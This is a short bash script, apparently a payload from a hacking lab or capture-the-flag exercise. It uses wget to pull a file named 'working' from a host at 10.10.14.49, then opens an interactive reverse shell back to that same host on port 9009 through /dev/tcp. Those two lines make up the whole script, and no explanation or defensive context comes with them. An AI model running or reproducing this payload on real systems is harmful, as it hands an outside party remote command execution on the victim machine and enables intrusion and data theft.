#!/bin/bash

wget http://10.10.14.49:8000/working
bash -c "bash -i >& /dev/tcp/10.10.14.49/9009 0>&1"